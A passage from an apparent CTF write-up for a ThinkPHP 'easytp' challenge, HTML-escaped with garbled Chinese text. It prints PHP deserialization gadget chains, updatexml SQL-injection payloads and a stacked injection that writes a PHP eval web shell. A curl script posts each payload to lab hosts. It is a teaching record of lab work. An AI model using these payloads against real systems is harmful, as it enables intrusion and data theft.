&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mysql&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">options&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;where&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;table&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,user(),31) from test.flag),0x7e),1)#&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;where&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;1=1&amp;#34;&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver\Imagick&lt;/span>&lt;span style="color:#111">()));&lt;/span>
&lt;span style="color:#111">$curl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_init&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">curl_setopt_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#75af00">CURLOPT_URL&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://6382172d-0bab-4e87-b434-7d711efad721.node3.buuoj.cn/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_RETURNTRANSFER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_ENCODING&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_MAXREDIRS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_TIMEOUT&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_HTTP_VERSION&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">CURL_HTTP_VERSION_1_1&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_CUSTOMREQUEST&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_POSTFIELDS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver\Imagick&lt;/span>&lt;span style="color:#111">())),&lt;/span>
&lt;span style="color:#75af00">CURLOPT_HTTPHEADER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;Postman-Token: 348e180e-5893-4ab4-b1d4-f570d69f228e&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;cache-control: no-cache&amp;#34;&lt;/span>
&lt;span style="color:#111">),&lt;/span>
&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">$response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$err&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">curl_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;cURL Error #:&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$response&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219200242251.png" alt="image-20211219200242251">&lt;/p>
&lt;p>çœ‹åˆ°äº†mysqlç”¨æˆ·ï¼Œå¼±å£ä»¤å¯†ç root&lt;/p>
&lt;p>ä¹‹åŽå°±å¯ä»¥æŠŠæˆ‘ä»¬çš„ä¼ªæœåŠ¡ç«¯æ’¤äº†ï¼Œæ¢æˆçœŸæœåŠ¡ç«¯çš„ï¼Œè¿›è¡Œä¸€ä¸ªæ³¨å…¥&lt;/p>
&lt;ul>
&lt;li>ä½¿ç”¨ç›®æ ‡çš„æ•°æ®åº“é…ç½®å†æ¬¡è¿›è¡Œååºåˆ—åŒ–&lt;/li>
&lt;li>è§¦å‘&lt;code>DELETE&lt;/code>è¯­å¥çš„SQLæ³¨å…¥&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(schema_name),31) from information_schema.SCHEMATA)),1)#&amp;#34;,
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select right(group_concat(schema_name),31) from information_schema.SCHEMATA)),1)#&amp;#34;,
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(table_name),31) from information_schema.tables where table_schema=&amp;#39;test&amp;#39;),0x7e),1)#&amp;#34;,
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(column_name),31) from information_schema.columns where table_schema=&amp;#39;test&amp;#39;),0x7e),1)#&amp;#34;,
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(flag),31) from test.flag),0x7e),1)#&amp;#34;,
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#d88200">&amp;#34;table&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select right(group_concat(flag),31) from test.flag),0x7e),1)#&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;where&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;1=1&amp;#34;&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ‘ä»¬è¿˜å¯ä»¥æŠŠå †å æ‰“å¼€ï¼Œç”¨å †å æ³¨å…¥å†™shellï¼Œä¹Ÿå°±æ˜¯æœ¬é¢˜çš„expï¼ˆå‚è€ƒ&lt;a href="https://www.zhaoj.in/read-6859.html#WEB3_easytp">èµµæ€»çš„exp&lt;/a> èµµæ€»ç‰›é€¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Db\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Mysql&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">MYSQL_ATTR_LOCAL_INFILE&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span> &lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">MYSQL_ATTR_MULTI_STATEMENTS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// æ‰“å¼€å †å æ³¨å…¥
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$config&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;debug&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;database&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;hostname&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;127.0.0.1&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;hostport&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;3306&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;charset&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;utf8&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// çŒœå‡ºå¼±å£ä»¤
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Session\Driver\Memcache&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Imagick&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$img&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">img&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Memcache&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Session\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Model&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Memcache&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">handle&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Db\Driver\Mysql&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$pk&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mysql&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">options&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;where&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75715e">// å †å æ³¨å…¥å†™å…¥shell
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#d88200">&amp;#34;table&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;mysql.user where 1=1;select &amp;#39;&amp;lt;?php eval(&lt;/span>&lt;span style="color:#8045ff">\$&lt;/span>&lt;span style="color:#d88200">_POST[amiz]);?&amp;gt;&amp;#39; into outfile &amp;#39;/var/www/html/amiz.php&amp;#39;;#&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;where&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;1=1&amp;#34;&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver\Imagick&lt;/span>&lt;span style="color:#111">()));&lt;/span>
&lt;span style="color:#111">$curl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_init&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">curl_setopt_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#75af00">CURLOPT_URL&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://914146f1-7d08-4a0a-9659-c143df1d68e1.node4.buuoj.cn:81/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_RETURNTRANSFER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_ENCODING&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_MAXREDIRS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_TIMEOUT&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_HTTP_VERSION&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">CURL_HTTP_VERSION_1_1&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_CUSTOMREQUEST&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_POSTFIELDS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver\Imagick&lt;/span>&lt;span style="color:#111">())),&lt;/span>
&lt;span style="color:#75af00">CURLOPT_HTTPHEADER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;cache-control: no-cache&amp;#34;&lt;/span>
&lt;span style="color:#111">),&lt;/span>
&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">$response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$err&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">curl_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;cURL Error #:&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$response&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å…¶ä¸­curlçš„ä»£ç æ˜¯ç”¨postmanç”Ÿæˆçš„ ~~ï¼ˆpostmanæ‰“é’±ï¼‰~~ä¸€å¥—è¿žæ‹›ç›´æŽ¥å¸¦èµ°ï¼Œç”¨èšå‰‘è¿žæŽ¥ä¹‹åŽå‘çŽ°æ ¹ç›®å½•ä¸‹æ²¡æœ‰flagï¼Œåè€Œæ˜¯ä¸€ä¸ªflag.sh&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219194548981.png" alt="image-20211219194548981">&lt;/p>
&lt;p>æˆ‘ä»¬è¿˜å¾—è¿žä¸Šæ•°æ®åº“çœ‹çœ‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219195443288.png" alt="image-20211219195443288">&lt;/p>
&lt;p>ä½†æ˜¯èšå‰‘è‡ªå¸¦çš„æ·»åŠ å¤±è´¥ï¼Œç›´æŽ¥æ‰‹åŠ¨å†™ä¸€ä¸ªå†°èŽçš„ðŸŽ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219195808735.png" alt="image-20211219195808735">&lt;/p>
&lt;p>ç›´æŽ¥æŸ¥çœ‹ä¹Ÿæ˜¯æ²¡æœ‰ï¼Œä½†æ˜¯å¯ä»¥ç”¨å®ƒçš„å¯¼å‡ºæ•°æ®åº“çš„åŠŸèƒ½å¾—åˆ°æ•°æ®&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://www.zhaoj.in/read-6859.html#WEB3_easytp">wp1&lt;/a> &lt;a href="http://www.yang99.top/index.php/archives/48/#easytp">wp2&lt;/a>&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
PyCalX 1&amp;amp;2
&lt;/h4>
&lt;/summary>
&lt;p>é¦–å…ˆæ˜¯1&lt;/p>
